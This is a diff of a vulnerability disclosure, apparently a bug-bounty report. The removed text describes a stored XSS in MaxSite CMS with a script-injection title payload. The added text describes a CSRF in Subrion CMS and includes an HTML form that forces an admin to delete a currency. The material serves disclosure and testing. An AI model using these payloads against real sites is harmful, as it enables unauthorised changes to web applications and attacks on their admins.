@@ -1,9 +1,20 @@
 # Description
-MaxSite CMS is a  CMS written in PHP.The Latest release of the version is affected with a Cross Site Scripting due to unsanitized user Input.The issue helps a malicious Admin/Sub-admin to attack other admins.
+`Subrion` is PHP based CMS. It is one of the best CMS I ever used.The Project is vulnerable to CSRF attack which allows a user to force admin to delete the "Currencies" added in the site.
 
-# POC
-1:This is Link to Download the CMS [Here](https://github.com/maxsite/cms)  
-2:Extract the zipfile to an Apache Server . Set UP the CMS    
-3:Now after the proper installation of the CMS. Navigate to http://localhost/huntr/cms/admin/options .It is the page which allows admin to edit the title and layout.
-4:In the add Title area enter the payload "asd"></title><script>alert(1)</script>"
-4:You will end up with an XSS popup which leaves the admin panel vulnerable. 
+# Steps To Reproduce & POC
+1:Download and Setup `Subrion` [Subrion-Link](https://github.com/intelliants/subrion/)   
+2:Extract the source code to an Apache server with MYSQL   
+3:As Default 3 Currencies are added in the Site you can view it by navigaing to http://localhost/huntr/subrion/panel/currencies/   
+4:Save the below code as HTML and Click Submit . The Currencie will be deleted    
+```
+html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost/subrion/panel/currencies/delete/EUR/">
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+```
+# Impact
+This can allow a user to force admin to remove "Currencies" from the website
